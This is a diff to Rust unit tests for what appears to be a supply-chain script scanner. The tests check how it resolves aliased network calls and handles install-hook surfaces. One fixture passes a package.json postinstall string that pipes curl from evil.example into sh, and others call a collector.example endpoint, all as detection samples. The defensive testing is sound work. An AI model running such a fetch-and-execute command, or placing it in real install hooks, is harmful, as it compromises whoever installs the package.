@@ -1,12 +1,19 @@
-use super::*;
-use crate::SurfaceKind;
+use super::{analyze as analyze_source, ArgumentShape, Fact, FactKind, ScriptLanguage};
 
-fn script(rel: &str, content: &str) -> SurfaceFile {
-    SurfaceFile {
+struct TestScript {
+    rel: String,
+    content: String,
+}
+
+fn script(rel: &str, content: &str) -> TestScript {
+    TestScript {
         rel: rel.to_string(),
         content: content.to_string(),
-        kind: SurfaceKind::Script,
     }
+}
+
+fn analyze(file: &TestScript) -> anyhow::Result<Vec<Fact>> {
+    analyze_source(&file.rel, &file.content)
 }
 
 #[test]
@@ -99,6 +106,27 @@ fn resolves_javascript_import_alias_and_concat() {
         call.arguments[0].resolved.as_deref(),
         Some("https://collector.example/v1")
     );
+}
+
+#[test]
+fn resolves_callable_reference_aliases() {
+    let javascript = analyze(&script(
+        "collect.js",
+        "const originalFetch = globalThis.fetch; originalFetch('https://collector.example/v1');",
+    ))
+    .expect("parse javascript");
+    assert!(javascript
+        .iter()
+        .any(|fact| fact.callee.as_deref() == Some("globalThis.fetch")));
+
+    let python = analyze(&script(
+        "collect.py",
+        "import requests\nsend = requests.get\nsend('https://collector.example/v1')",
+    ))
+    .expect("parse python");
+    assert!(python
+        .iter()
+        .any(|fact| fact.callee.as_deref() == Some("requests.get")));
 }
 
 #[test]
@@ -205,6 +233,27 @@ fn malformed_supported_script_fails_closed() {
 fn unsupported_script_is_explicit() {
     let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
     assert_eq!(facts[0].kind, FactKind::Unsupported);
+}
+
+#[test]
+fn explicit_language_supports_virtual_execution_surfaces() {
+    let facts = super::analyze_with_language(
+        "package.json:scripts/postinstall",
+        "curl https://evil.example/payload | sh",
+        ScriptLanguage::Bash,
+    )
+    .expect("parse explicit Bash");
+    assert!(facts.iter().any(|fact| fact.kind == FactKind::Pipeline));
+}
+
+#[test]
+fn infers_all_supported_node_extensions() {
+    for path in ["index.js", "index.mjs", "index.cjs"] {
+        assert_eq!(ScriptLanguage::from_path(path), ScriptLanguage::JavaScript);
+    }
+    for path in ["index.ts", "index.mts", "index.cts"] {
+        assert_eq!(ScriptLanguage::from_path(path), ScriptLanguage::TypeScript);
+    }
 }
 
 #[test]
